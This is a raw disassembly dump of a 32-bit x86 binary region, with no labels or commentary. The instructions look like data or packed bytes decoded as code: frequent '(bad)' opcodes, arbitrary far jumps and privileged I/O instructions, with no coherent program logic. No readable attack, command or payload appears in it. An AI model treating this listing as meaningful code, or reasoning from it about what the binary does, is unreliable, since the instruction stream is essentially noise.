  411e5b:	jl     0x411e10
  411e5d:	mov    cl,0xe6
  411e5f:	inc    edi
  411e60:	pusha  
  411e61:	mov    al,0xee
  411e63:	ror    DWORD PTR [ebx-0x34e62a44],1
  411e69:	mov    al,0xa8
  411e6b:	inc    edx
  411e6c:	(bad)  
  411e6d:	xchg   esp,eax
  411e6e:	cmp    al,0x7b
  411e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e71:	adc    ah,BYTE PTR [esp+ebx*2-0x23494f46]
  411e78:	nop
  411e79:	xchg   ebx,eax
  411e7a:	fild   WORD PTR [ebx]
  411e7c:	mov    ah,0x13
  411e7e:	lock inc esi
  411e80:	call   0x96b0:0x9a5c651a
  411e87:	jns    0x411e59
  411e89:	mov    al,0x2f
  411e8b:	inc    edi
  411e8c:	clc    
  411e8d:	mov    al,ds:0xd186
	...
  411ea2:	add    BYTE PTR [eax],al
  411ea4:	xchg   ebx,eax
  411ea5:	mov    esp,0xb073e865
  411eaa:	cli    
  411eab:	inc    ebx
  411eac:	call   0xae94:0x8c04eb19
  411eb3:	shl    DWORD PTR [ebx-0x6b],0xdf
  411eb7:	add    ecx,DWORD PTR [edi+edx*8-0x67b5b054]
  411ebe:	fild   WORD PTR [ebx]
  411ec0:	mov    dh,0x94
  411ec2:	leave  
  411ec3:	add    esp,DWORD PTR [esi+0x103d994]
  411ec9:	pop    edx
  411eca:	cmp    esi,DWORD PTR [eax+ebx*1-0x2cc2f6e6]
  411ed1:	scas   al,BYTE PTR es:[edi]
  411ed2:	cmc    
  411ed3:	cdq    
  411ed4:	shr    BYTE PTR [eax],cl
  411ed6:	lock es cmp eax,0xf3c1e0ac
  411edd:	scas   eax,DWORD PTR es:[edi]
  411ede:	cmc    
  411edf:	loop   0x411f30
  411ee1:	and    ecx,DWORD PTR [ebx]
  411ee3:	add    dl,al
  411ee5:	scas   eax,DWORD PTR es:[edi]
  411ee6:	cmc    
  411ee7:	jmp    0xa8821dc3
  411eec:	(bad)  
  411eed:	scas   eax,DWORD PTR es:[edi]
  411eee:	jnp    0x411ed5
  411ef0:	inc    edi
  411ef1:	cld    
  411ef2:	cmp    esi,ebp
  411ef4:	push   edx
  411ef5:	pop    edi
  411ef6:	cmp    DWORD PTR [ecx-0x2902e7ac],0x3b58ae52
  411f00:	pusha  
  411f01:	or     al,0x3a
  411f03:	into   
  411f04:	push   edx
  411f05:	sbb    al,0x8c
  411f07:	mov    ecx,0x0
	...
  411f1c:	inc    edx
  411f1d:	scas   al,BYTE PTR es:[edi]
  411f1e:	cmc    
  411f1f:	rol    DWORD PTR [edx+0x7e],1
  411f22:	cmc    
  411f23:	mov    dh,0xc5
  411f25:	scas   eax,DWORD PTR es:[edi]
  411f26:	ins    DWORD PTR es:[edi],dx
  411f27:	lods   eax,DWORD PTR ds:[esi]
  411f28:	ret    
  411f29:	push   esp
  411f2a:	or     BYTE PTR [esi-0x61024004],ah
  411f30:	shr    BYTE PTR [esi-0x5a181e85],cl
  411f36:	cmp    cl,BYTE PTR [esi-0x6a73e32e]
  411f3c:	ret    0xf5ae
  411f3f:	push   0x14
  411f41:	mov    ebx,0xafca76fd
  411f46:	jns    0x411f62
  411f48:	cmp    BYTE PTR [ebx+eiz*2-0x44507058],dl
  411f4f:	dec    ebp
  411f50:	fisubr DWORD PTR [esi+0x61f541f5]
  411f56:	cmc    
  411f57:	dec    esi
  411f58:	call   FWORD PTR [esi+0x60]
  411f5b:	add    BYTE PTR [ecx],ah
  411f5d:	cwde   
  411f5e:	or     BYTE PTR [eax],al
  411f60:	push   0x4
  411f62:	out    dx,al
  411f63:	neg    DWORD PTR [edx+0x56]
  411f66:	ins    DWORD PTR es:[edi],dx
  411f67:	mov    cl,0xed
  411f69:	xlat   BYTE PTR ds:[ebx]
  411f6a:	cmc    
  411f6b:	addr16 mov ebp,cs
  411f6e:	dec    eax
  411f6f:	add    BYTE PTR ds:0xf54164a8,bl
  411f75:	dec    edx
  411f76:	inc    edi
  411f77:	sbb    esp,ebp
  411f79:	xchg   edx,eax
  411f7a:	mov    eax,edi
  411f7c:	out    0xe0,al
  411f7e:	sbb    eax,0x68
	...
  411f93:	add    ch,dh
  411f95:	xchg   edx,eax
  411f96:	in     eax,0xbe
  411f98:	or     eax,0xe5416375
  411f9d:	push   ebp
  411f9e:	mov    esp,0xf658b2e8
  411fa3:	jmp    DWORD PTR [eax-0x58]
  411fa6:	in     eax,dx
  411fa7:	outs   dx,DWORD PTR ds:[esi]
  411fa8:	jge    0x412003
  411faa:	imul   al
  411fac:	pop    ebp
  411fad:	mov    ebp,esi
  411faf:	dec    edx
  411fb1:	fiadd  WORD PTR ds:0xfe4820ff
  411fb7:	(bad)  
  411fb8:	ficomp DWORD PTR [eax+0x7c]
  411fbb:	or     ch,cl
  411fbd:	dec    esp
  411fbe:	repz (bad) 
  411fc0:	jmp    0xf658:0x22f0bc58
  411fc7:	call   0x36a785
  411fcc:	or     bl,BYTE PTR [esi]
  411fce:	loop   0x411fc7
  411fd0:	or     bl,BYTE PTR [eax-0x13]
  411fd3:	push   ecx
  411fd4:	pop    edx
  411fd5:	pop    ecx
  411fd6:	idiv   bh
  411fd8:	mov    al,0x60
  411fda:	loopne 0x411fe0
  411fdc:	jmp    0xed56:0x30fff657
  411fe3:	ins    DWORD PTR es:[edi],dx
  411fe4:	mov    ds,WORD PTR [eax+0x108cff08]
  411fea:	push   ebp
  411feb:	idiv   BYTE PTR [ebx]
  411fed:	pop    edi
  411fee:	push   esp
  411fef:	xor    eax,0xc84b5663
  411ff4:	dec    esi
  411ff5:	ror    BYTE PTR [ecx],0x55
	...
  41200c:	pop    ss
  41200d:	pop    eax
  41200e:	xchg   ebx,eax
  412010:	sbb    dl,dl
  412012:	or     DWORD PTR [edx-0x49],ebp
  412015:	jbe    0x411fdc
  412017:	pop    es
  412018:	hlt    
  412019:	rcr    DWORD PTR ds:0xb53503ff,cl
  41201f:	sti    
  412020:	sti    
  412021:	or     dl,dh
  412023:	addr16 out dx,al
  412025:	pop    es
  412026:	retf   
  412027:	(bad)  
  412028:	jmp    0x51bb:0x4d4738e8
  41202f:	(bad)  
  412030:	fidivr DWORD PTR [esi-0x5ca601b4]
  412036:	shl    ecx,1
  412038:	cmp    BYTE PTR [esp+ecx*1+0x68],bh
  41203c:	mov    ?,WORD PTR [ebx+0x5fa48009]
  412042:	dec    esi
  412043:	(bad)  
  412044:	mov    bl,0x43
  412046:	or     al,0x0
  412048:	mov    ebx,0x3121d12d
  41204d:	jl     0x41205b
  41204f:	push   0xffc9706b
  412054:	xchg   edx,eax
  412055:	nop
  412056:	hlt    
  412057:	out    0xaa,eax
  412059:	push   ebx
  41205a:	dec    ebx
  41205b:	inc    BYTE PTR [ebx+0x1fe4090]
  412061:	mov    ah,0x51
  412063:	push   ebx
  412064:	mov    al,ds:0x4ec84d16
  412069:	mov    bh,0x9
  41206b:	push   ebp
  41206c:	pop    ss
  41206d:	pop    ss
  41206e:	mov    eax,ebx
	...
  412084:	adc    al,0x26
  412086:	dec    esp
  412087:	inc    BYTE PTR [ecx]
  412089:	xchg   esp,eax
  41208a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41208b:	inc    edi
  41208c:	fld    TBYTE PTR [ebp+0x2742f7dc]
  412092:	out    0x5b,eax
  412094:	daa    
  412095:	mov    bl,bh
  412097:	add    eax,DWORD PTR [edi+0x327efed4]
  41209d:	xchg   edx,eax
  41209e:	fild   WORD PTR [ebx]
  4120a0:	dec    ebx
  4120a1:	push   edi
  4120a2:	aaa    
  4120a3:	add    ecx,DWORD PTR [esp+edx*4-0x5737c321]
  4120aa:	cs cld 
  4120ac:	or     ebp,DWORD PTR [ebp-0x6b89fc67]
  4120b2:	mov    DWORD PTR [ebx],eax
  4120b4:	xchg   sp,ax
  4120b6:	push   esp
  4120b7:	mov    esi,0x7e7c43ff
  4120bc:	fbld   TBYTE PTR [esi+esi*8+0x74ad5343]
  4120c3:	dec    ebx
  4120c4:	fisub  DWORD PTR [esi]
  4120c6:	jecxz  0x412122
  4120c8:	adc    DWORD PTR [edx-0x2b68fc21],ecx
  4120ce:	pop    ebx
  4120cf:	or     DWORD PTR [ebp-0x73fc1e07],esi
  4120d5:	cmp    al,0x76
  4120d7:	int3   
  4120d8:	dec    esp
  4120d9:	xchg   esp,eax
  4120da:	into   
  4120db:	mov    ecx,0xf5e6bc97
  4120e0:	mov    ds:0x8546aac,al
  4120e5:	pop    ss
  4120e6:	mov    esp,0x3b
	...
  4120fb:	add    BYTE PTR [edx+0x73d62fac],dl
  412101:	inc    ecx
  412102:	rol    DWORD PTR [edx-0x7e],1
  412105:	push   ds
  412106:	gs xor al,0x82
  412109:	lods   al,BYTE PTR ds:[esi]
  41210a:	xchg   BYTE PTR [esi-0x4ec2cb8d],ch
  412110:	int3   
  412111:	xchg   esp,eax
  412112:	jbe    0x41218d
  412114:	jae    0x4120ba
  412116:	or     BYTE PTR [esi-0x31],dh
  412119:	stos   BYTE PTR es:[edi],al
  41211a:	jnp    0x4120fd
  41211c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41211d:	dec    ecx
  41211e:	aaa    
  41211f:	iretw  
  412121:	sbb    al,0x8c
  412123:	dec    ebp
  412124:	xchg   DWORD PTR [edx+0x3c8fc3f5],ebp
  41212a:	push   ecx
  41212b:	mov    esp,0x7cf6ac48
  412130:	pusha  
  412131:	mov    ds:0x20cf3ef5,al
  412136:	add    BYTE PTR [ecx+0x53],al
  412139:	gs cmc 
  41213b:	add    DWORD PTR cs:[ecx],edx
  41213e:	loope  0x41215e
  412140:	dec    edi
  412141:	stos   BYTE PTR es:[edi],al
  412142:	(bad)  
  412143:	jmp    0xa8a4537f
  412148:	(bad)  
  412149:	stos   DWORD PTR es:[edi],eax
  41214a:	mov    ebx,0xf5aab719
  41214f:	push   es
  412150:	and    eax,0xd8d1e094
  412155:	stos   BYTE PTR es:[edi],al
  412156:	cmc    
  412157:	pusha  
  412158:	add    eax,0x4eeefdb8
  41215d:	sbb    BYTE PTR [ebp+eax*8+0x0],cl
	...
  412174:	xchg   BYTE PTR [edx+0x3bf039f5],ch
  41217a:	arpl   WORD PTR [eax],bp
  41217c:	nop
  41217d:	stos   DWORD PTR es:[edi],eax
  41217e:	mov    ebx,0xf5aa76d9
  412183:	(bad)  
  412184:	in     al,0x93
  412186:	loopne 0x412179
  412188:	cwde   
  412189:	stos   BYTE PTR es:[edi],al
  41218a:	cmc    
  41218b:	pusha  
  41218c:	add    al,0xcc
  41218e:	std    
  41218f:	scas   al,BYTE PTR es:[edi]
  412190:	dec    esi
  412191:	cmp    eax,0x38481108
  412196:	inc    edi
  412197:	jmp    0x9f3a026a
  41219c:	into   
  41219d:	stos   BYTE PTR es:[edi],al
  41219e:	cmc    
  41219f:	adc    al,0x80
  4121a1:	mov    esp,0x562500e3
  4121a6:	test   BYTE PTR [ecx-0x1b018],0xe2
  4121ad:	add    al,0x8d
  4121af:	rcr    dl,1
  4121b1:	push   esi
  4121b2:	not    BYTE PTR [eax+0x5d]
  4121b5:	adc    ah,BYTE PTR [ebp+0x41]
  4121b8:	xor    eax,0xdaf0bc56
  4121bd:	push   esi
  4121be:	idiv   bh
  4121c0:	pop    eax
  4121c1:	lahf   
  4121c2:	loopne 0x412191
  4121c4:	and    eax,0xa889f656
  4121c9:	inc    ebx
  4121ca:	(bad)  
  4121cb:	jmp    DWORD PTR [edx-0x7]
  4121ce:	cmc    
  4121cf:	addr16 mov dl,0xe4
  4121d2:	dec    eax
  4121d3:	add    BYTE PTR [edx+0xf7e52c],dh
	...
  4121e9:	add    BYTE PTR [eax],al
  4121eb:	add    BYTE PTR [edx-0x128a09aa],ah
  4121f1:	jle    0x4121aa
  4121f3:	xor    BYTE PTR [edx-0x5e7a7faa],al
  4121f9:	outs   dx,BYTE PTR ds:[esi]
  4121fa:	idiv   bh
  4121fc:	jo     0x41221a
  4121fe:	retf   0xe2f7
  412201:	push   esp
  412202:	inc    ebp
  412203:	push   0x48e43f
  412208:	mov    dl,0x22
  41220a:	in     eax,0xf7
  41220c:	loop   0x412262
  41220e:	div    BYTE PTR [ebp-0x53]
  412211:	jle    0x4121aa
  412213:	xor    dl,al
  412215:	push   esp
  412216:	add    BYTE PTR [ebp-0x99323],0x3f
  41221d:	nop
  41221e:	pusha  
  41221f:	mov    ds:0xfef5d750,eax
  412224:	sbb    BYTE PTR [eax-0x2],ah
  412227:	push   DWORD PTR [edx]
  412229:	push   esp
  41222a:	jl     0x412234
  41222c:	sbb    eax,0x8cff25ec
  412231:	add    al,BYTE PTR [edx+0x48034c84]
  412237:	(bad)  
  412238:	sbb    DWORD PTR [ecx],edi
  41223a:	je     0x412232
  41223c:	arpl   WORD PTR [ebx],bp
  41223e:	fsub   QWORD PTR [edi+0x2b]
  412241:	xchg   ecx,eax
  412242:	leave  
  412243:	call   DWORD PTR [edx+0x61]
  412246:	cmp    al,0xf6
  412248:	dec    ebx
  412249:	xor    eax,DWORD PTR [edi+0x74]
  41224c:	xchg   esp,eax
  41224d:	inc    ebx
  41224e:	iret   
  41224f:	das    
	...
  412264:	cmp    eax,DWORD PTR [ebx-0x7f]
  412267:	test   al,dh
  412269:	inc    edx
  41226a:	inc    edi
  41226b:	dec    BYTE PTR [edi]
  41226d:	adc    DWORD PTR [ecx],edi
  41226f:	mul    BYTE PTR [ebx]
  412271:	imul   ecx,DWORD PTR [edi+ecx*1],0x10
  412275:	jnp    0x412283
  412277:	add    BYTE PTR [esi+edi*1+0x7303cf75],cl
  41227e:	inc    edi
  41227f:	(bad)  
  412280:	js     0x41223a
  412282:	mov    WORD PTR [esp+esi*1-0x7301b875],?
  412289:	retf   0xb08d
  41228c:	mov    WORD PTR [ebx-0x447397f7],?
  412292:	cmp    BYTE PTR [ebp-0x17e6d725],bh
  412298:	push   ss
  412299:	aad    0x48
  41229b:	dec    bl
  41229d:	or     BYTE PTR [esi],ah
  41229f:	test   bl,0xca
  4122a2:	dec    eax
  4122a3:	je     0x412241
  4122a5:	rcl    DWORD PTR [edi],cl
  4122a7:	sub    dh,BYTE PTR [ebx-0x4b4bb726]
  4122ad:	jmp    0xe81c:0x60a3fe48
  4122b4:	mov    WORD PTR [ebp+0x2093fe47],ss
  4122ba:	sub    eax,0xae948bf6
  4122bf:	inc    eax
  4122c0:	clc    
  4122c1:	test   BYTE PTR [edi-0x61565bcb],dl
  4122c7:	inc    eax
	...
  4122dc:	cmp    al,cl
  4122de:	sahf   
  4122df:	inc    eax
  4122e0:	push   0xffffffa9
  4122e2:	xor    al,0x23
  4122e4:	pop    edx
  4122e5:	test   eax,0x84e04076
  4122ea:	xchg   DWORD PTR [ebp-0x5c],esi
  4122ed:	test   eax,0xcc004066
  4122f2:	push   esi
  4122f3:	inc    eax
  4122f4:	inc    edx
  4122f5:	test   eax,0xc42413dc
  4122fa:	or     BYTE PTR [ecx+0x32],al
  4122fd:	test   eax,0xa922539c
  412302:	dec    esi
  412303:	inc    eax
  412304:	fdivr  DWORD PTR [edi-0x56e5bfc2]
  41230a:	mov    ah,0x13
  41230c:	and    al,0x4
  41230e:	or     DWORD PTR [ecx+0xa],eax
  412311:	test   eax,0xa8fa4f54
  412316:	push   ss
  412317:	inc    eax
  412318:	add    BYTE PTR [edi+eax*1+0x6a9a471],0x40
  412320:	and    al,dl
  412322:	idiv   BYTE PTR [edi]
  412324:	loop   0x4122ce
  412326:	cmp    al,0x4b
  412328:	loop   0x4122d2
  41232a:	(bad)  
  41232b:	aas    
  41232c:	pop    eax
  41232d:	test   BYTE PTR [edi],al
  41232f:	mov    cl,0x74
  412331:	test   eax,0xd3f83fee
  412336:	fidivr WORD PTR [edi]
  412338:	mov    edx,0xa41454a8
  41233d:	pop    ss
  41233e:	or     DWORD PTR [edi],edi
	...
  412354:	stos   BYTE PTR es:[edi],al
  412355:	test   al,0x74
  412357:	jl     0x4122f3
  412359:	test   al,0xb6
  41235b:	aas    
  41235c:	loopne 0x412345
  41235e:	or     BYTE PTR [esi+0x34f5aa53],bh
  412364:	mov    al,ds:0xc2d044bc
  412369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41236a:	cmc    
  41236b:	adc    al,0xa0
  41236d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41236e:	mov    ebx,0xf5a6bb99
  412373:	mov    fs,WORD PTR ds:0xcd6be090
  412379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41237a:	cmc    
  41237b:	jle    0x412352
  41237d:	mov    bh,0xfd
  41237f:	jbe    0x412314
  412381:	scas   eax,DWORD PTR es:[edi]
  412382:	aas    
  412383:	mov    ebp,0x9cf5a68a
  412388:	jl     0x412328
  41238a:	cmc    
  41238b:	pop    esi
  41238c:	push   0x73562469
  412391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412392:	mov    ebx,0xf5a66341
  412397:	push   ecx
  412398:	pop    ds
  412399:	jl     0x412390
  41239b:	ds pop ebx
  41239d:	loopne 0x41238b
  41239f:	ds push ebx
  4123a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a2:	loopne 0x4123a5
  4123a4:	cld    
  4123a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a6:	cmc    
  4123a7:	es test edi,eax
  4123aa:	std    
  4123ab:	push   ds
  4123ac:	mov    ebx,0xb2c513af
  4123b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b2:	cmc    
  4123b3:	push   esp
  4123b4:	dec    eax
  4123b5:	sahf   
  4123b6:	cmc    
  4123b7:	push   es
	...
  4123cc:	mov    al,0x85
  4123ce:	and    al,0xfe
  4123d0:	call   0xf5a6:0x9b1dbba6
  4123d7:	add    DWORD PTR [ebx-0x7d190a88],edx
  4123dd:	loopne 0x4123a3
  4123df:	(bad)  
  4123e0:	jp     0x412388
  4123e2:	loopne 0x4123b9
  4123e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123e6:	cmc    
  4123e7:	into   
  4123e8:	and    al,0xcf
  4123ea:	std    
  4123eb:	add    dl,cl
  4123ed:	in     ax,dx
  4123ef:	icebp  
  4123f0:	jle    0x412459
  4123f2:	idiv   bh
  4123f4:	adc    BYTE PTR [ebx-0x2],dl
  4123f7:	(bad)  
  4123f8:	cmp    bh,BYTE PTR [ebx-0x15]
  4123fb:	sub    ebp,DWORD PTR [edx]
  4123fd:	data16 div BYTE PTR [ebp-0x9a127]
  412404:	or     eax,0x1aff224a
  412409:	dec    sp
  41240b:	clc    
  41240c:	cld    
  41240d:	mov    edx,0x66dafff4
  412412:	jl     0x412410
  412414:	or     eax,0x35001e5e
  412419:	pop    eax
  41241a:	(bad)  
  41241b:	or     al,0x35
  41241d:	int3   
  41241e:	sub    ah,0xa6
  412421:	dec    edi
  412422:	icebp  
  412423:	push   0x25
  412425:	std    
  412426:	push   ecx
  412427:	inc    DWORD PTR [eax-0x65]
  41242a:	loopne 0x412419
  41242c:	jge    0x412495
  41242e:	test   BYTE PTR [ecx+0x0],0x0
	...
  412441:	add    BYTE PTR [eax],al
  412443:	add    al,dh
  412445:	data16 div BYTE PTR [ebp+0x2d]
  412449:	sti    
  41244a:	xor    BYTE PTR [ebp+0x34],ch
  41244d:	xchg   ebx,eax
  41244e:	cmc    
  41244f:	xor    eax,0x48dbc6
  412454:	popf   
  412455:	inc    esp
  412456:	icebp  
  412457:	call   FWORD PTR [edx+0xd087c66]
  41245d:	test   al,0x64
  41245f:	inc    ecx
  412460:	cmc    
  412461:	cli    
  412462:	pop    es
  412463:	add    ch,ah
  412465:	adc    ch,dh
  412467:	mov    ebx,0xfff668d9
  41246c:	inc    eax
  41246d:	div    BYTE PTR [di-0x43]
  412471:	jp     0x412468
  412473:	sub    dl,bl
  412475:	push   0xb98cc2c0
  41247a:	or     DWORD PTR [ebp+0x17],edx
  41247d:	jmp    0x44e1e809
  412482:	or     al,0x0
  412484:	stos   DWORD PTR es:[edi],eax
  412485:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  412487:	mov    ebx,0xff0c7c21
  41248c:	add    eax,ecx
  41248e:	xor    al,0x74
  412490:	xchg   esp,eax
  412491:	add    ebx,esi
  412493:	push   ebx
  412494:	jnp    0x41249d
  412496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412497:	add    BYTE PTR [esi+ecx*1-0x56ab9889],cl
  41249e:	retf   0x62ff
  4124a1:	test   eax,0xa3e1ff05
  4124a6:	and    DWORD PTR [edi],edi
	...
  4124bc:	mov    eax,0xc1fe331e
  4124c1:	(bad)  
  4124c2:	and    DWORD PTR [ebp+0xa332e7c],esp
  4124c8:	dec    esp
  4124c9:	sar    dh,0x88
  4124cc:	leave  
  4124cd:	aas    
  4124ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124cf:	jmp    FWORD PTR [ebx]
  4124d1:	addr16 jbe 0x41253b
  4124d4:	loopne 0x412496
  4124d6:	retf   0x1aff
  4124d9:	loope  0x412510
  4124db:	(bad)  
  4124dc:	cdq    
  4124dd:	mov    bl,0x21
  4124df:	sbb    esp,DWORD PTR [eax+0x76]
  4124e2:	xor    esp,DWORD PTR [edi-0x73]
  4124e5:	mov    ebx,0x6364bd24
  4124ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124eb:	inc    eax
  4124ec:	mov    WORD PTR [esi-0x43],?
  4124ef:	sti    
  4124f0:	jmp    0x4124f2
  4124f2:	add    ch,al
  4124f4:	mov    eax,DWORD PTR [edi]
  4124f6:	xor    eax,0x3520dbfe
  4124fb:	out    0x81,eax
  4124fd:	shl    BYTE PTR [esi+edi*8],cl
  412500:	aad    0x79
  412502:	add    al,0x0
  412504:	pop    ecx
  412505:	xchg   esp,eax
  412506:	jp     0x412537
  412508:	push   cs
  412509:	shr    DWORD PTR [ebx-0x1d24c57],1
  41250f:	lods   eax,DWORD PTR ds:[esi]
  412510:	dec    esp
  412511:	xchg   esp,eax
  412512:	inc    edi
  412513:	and    eax,0x3cdf5330
  412518:	and    BYTE PTR [eax-0x5a9dfb29],bl
  41251e:	mov    esi,0x8
	...
  412533:	add    BYTE PTR [eax+eiz*1-0x23],cl
  412537:	mov    cl,al
  412539:	test   al,0xae
  41253b:	mov    dh,0x77
  41253d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41253e:	sbb    al,0xc
  412540:	fs inc ebp
  412542:	sahf   
  412543:	cmp    al,0x6a
  412545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412546:	sbb    al,0x40
  412548:	imul   edi,DWORD PTR [edi+0x3a5a3cd9],0xffffffdf
  41254f:	stos   DWORD PTR es:[edi],eax
  412550:	pushf  
  412551:	and    BYTE PTR ss:[esp+esi*4],al
  412555:	lods   eax,DWORD PTR ds:[esi]
  412556:	hlt    
  412557:	ret    0xa643
  41255a:	aam    0xf
  41255c:	and    al,0xcb
  41255e:	add    al,0x3d
  412560:	xor    bl,BYTE PTR [ecx+0x1b81b71f]
  412566:	lods   eax,DWORD PTR ds:[esi]
  412567:	aas    
  412568:	and    bl,BYTE PTR [edi]
  41256a:	dec    ebx
  41256b:	cmp    al,0xa0
  41256d:	pushf  
  41256e:	push   edi
  41256f:	repnz adc ah,BYTE PTR [ebp-0x577fc3c2]
  412576:	inc    edi
  412577:	fs mov ch,0xa5
  41257a:	cs test eax,0xada12cfb
  412580:	dec    esp
  412581:	xchg   esp,eax
  412582:	xchg   DWORD PTR [esi],edi
  412584:	js     0x4125d9
  412586:	fistp  QWORD PTR [eax+ebx*2]
  412589:	cwde   
  41258a:	pop    ss
  41258b:	push   0x7f6a5a8
  412590:	int3   
  412591:	pop    ds
  412592:	or     bh,bl
  412594:	push   ss
  412595:	push   eax
  412596:	hlt    
  412597:	out    dx,al
	...
  4125ac:	stc    
  4125ad:	test   al,0xf5
  4125af:	pop    esp
  4125b0:	mov    BYTE PTR [ecx+ecx*1-0xa598822],bh
  4125b7:	pop    esp
  4125b8:	lods   eax,DWORD PTR fs:[esi]
  4125ba:	outs   dx,DWORD PTR ds:[esi]
  4125bb:	add    esp,DWORD PTR [edi-0x5a]
  4125be:	sub    DWORD PTR [esp+ebx*2],0x55
  4125c2:	pusha  
  4125c3:	std    
  4125c4:	in     eax,0x53
  4125c6:	or     BYTE PTR [ecx-0x3b],al
  4125c9:	xor    BYTE PTR [edi-0x17],al
  4125cc:	(bad)  
  4125cd:	sub    BYTE PTR [ecx+edx*4],al
  4125d0:	cmp    esi,DWORD PTR [ecx-0xb]
  4125d3:	sahf   
  4125d4:	adc    esp,0x7c
  4125d7:	adc    BYTE PTR [ecx],bl
  4125d9:	pop    ecx
  4125da:	lock push 0x25
  4125dd:	test   al,0xc
  4125df:	cld    
  4125e0:	daa    
  4125e1:	cmovl  eax,DWORD PTR [ecx-0x26cb5bfd]
  4125e8:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4125ea:	cmc    
  4125eb:	test   DWORD PTR [esp+ebx*8-0x6b6ff1e8],0xae7fa47f
  4125f6:	inc    esp
  4125f7:	push   esi
  4125f8:	fnsave [ebx+0x54f5a360]
  4125fe:	or     BYTE PTR [ebp+ecx*2-0x24],dh
  412602:	pop    eax
  412603:	push   ecx
  412604:	inc    ecx
  412605:	mov    cl,BYTE PTR [eax]
  412607:	jmp    0x5c45fe1e
  41260c:	int    0xd7
  41260e:	pop    eax
  41260f:	je     0x412611
	...
  412621:	add    BYTE PTR [eax],al
  412623:	add    ch,cl
  412625:	fistp  DWORD PTR [eax-0x6f]
  412628:	mov    ah,0x30
  41262a:	inc    edi
  41262b:	jmp    0x1454ed6
  412630:	div    DWORD PTR [eax-0xb]
  412633:	add    BYTE PTR [edx-0x4e8b376d],dl
  412639:	adc    BYTE PTR [ebp-0x4],cl
  41263c:	ss (bad) 
  41263f:	add    edi,DWORD PTR [ebx]
  412641:	xchg   edx,eax
  412642:	cmc    
  412643:	jne    0x4125f6
  412645:	pop    esi
  412646:	jl     0x412650
  412648:	fstp   QWORD PTR [eax]
  41264a:	hlt    
  41264b:	inc    edx
  41264d:	pop    esi
  41264e:	jl     0x41264c
  412650:	int    0x66
  412652:	and    bh,bh
  412654:	rcr    BYTE PTR [esi+0x44],cl
  412657:	lock es fsubr st(5),st
  41265b:	add    al,cl
  41265d:	div    BYTE PTR cs:[ebp+0x3d]
  412661:	outs   dx,DWORD PTR ds:[esi]
  412662:	jmp    0x41268d
  412664:	xor    bl,BYTE PTR [esi-0x40]
  412667:	ret    0x977d
  41266a:	pop    ebx
  41266b:	mov    edx,DWORD PTR [ecx]
  41266d:	sbb    cl,dl
  41266f:	cld    
  412670:	(bad)  
  412671:	cwde   
  412672:	bound  ebx,QWORD PTR [ebp+0x12]
  412675:	in     al,0xd
  412677:	call   0x37dcd9
  41267c:	lods   al,BYTE PTR ds:[esi]
  41267d:	aam    0xf1
  41267f:	push   0xbee59735
  412684:	pop    ebp
  412685:	sub    esp,DWORD PTR [ecx+eax*2+0x0]
	...
  412699:	add    BYTE PTR [eax],al
  41269b:	add    BYTE PTR ds:0xf46dd9ef,ah
  4126a1:	xchg   esi,eax
  4126a2:	cmc    
  4126a3:	jne    0x4126d2
  4126a5:	outs   dx,DWORD PTR ds:[esi]
  4126a6:	cli    
  4126a7:	push   edx
  4126a8:	rcr    BYTE PTR [esi+0x6d],cl
  4126ab:	add    DWORD PTR ds:0xad68b36e,esp
  4126b1:	in     al,dx
  4126b2:	dec    eax
  4126b3:	add    ch,cl
  4126b5:	push   edx
  4126b6:	fs inc ecx
  4126b8:	in     eax,0x5d
  4126ba:	jl     0x4126c4
  4126bc:	popf   
  4126bd:	dec    ebx
  4126be:	push   edi
  4126bf:	dec    DWORD PTR [edx+ecx*4-0x5e1c005f]
  4126c6:	jo     0x41272f
  4126c8:	sbb    BYTE PTR [eax],cl
  4126ca:	int    0xff
  4126cc:	imul   eax,DWORD PTR [eax-0x5573bf60],0xffffffa5
  4126d3:	pop    es
  4126d4:	mov    ah,0x77
  4126d6:	(bad)  
  4126d8:	mov    ebx,0xa3000944
  4126dd:	add    ah,BYTE PTR [ebp+0xc6c39c7]
  4126e3:	push   0xffc95fc1
  4126e8:	call   0x2f7e:0xe2e8045f
  4126ef:	dec    BYTE PTR [ebx-0x32b8a35f]
  4126f5:	stos   DWORD PTR es:[edi],eax
  4126f6:	xor    BYTE PTR [esp+eax*4+0x3],dh
  4126fa:	xlat   BYTE PTR ds:[ebx]
  4126fb:	std    
  4126fc:	jae    0x412701
  4126fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126ff:	add    DWORD PTR [eax],eax
	...
  412711:	add    BYTE PTR [eax],al
  412713:	add    BYTE PTR [ebx+ebp*4-0x4c260177],cl
  41271a:	and    DWORD PTR [edx+ebx*2+0x1b],ecx
  41271e:	xor    dh,bh
  412720:	fstp   DWORD PTR [edi]
  412722:	das    
  412723:	je     0x4126b9
  412725:	adc    eax,DWORD PTR [edx+0x25]
  412728:	inc    ebx
  412729:	xor    eax,DWORD PTR [ecx-0x3f]
  41272c:	nop
  41272d:	stos   DWORD PTR es:[edi],eax
  41272e:	(bad)  
  41272f:	mov    ah,BYTE PTR [eax]
  412731:	das    
  412732:	dec    eax
  412733:	sti    
  412734:	sub    eax,ecx
  412736:	add    eax,0x219b99ff
  41273b:	xchg   edi,eax
  41273c:	push   ebp
  41273d:	pop    edx
  41273e:	das    
  41273f:	or     cl,BYTE PTR [eax+ebp*8-0x6]
  412743:	mov    BYTE PTR [ecx+0x67],dl
  412746:	das    
